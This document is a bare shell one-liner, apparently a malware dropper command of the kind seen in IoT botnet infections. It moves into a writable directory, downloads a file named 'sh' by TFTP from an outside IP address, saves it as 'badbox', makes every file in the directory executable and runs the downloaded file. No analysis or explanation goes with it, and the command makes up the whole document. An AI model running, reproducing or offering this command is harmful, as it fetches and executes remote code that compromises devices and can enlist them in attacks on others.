cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sh -g 149.56.13.32;cat sh >badbox;chmod +x *;./badbox
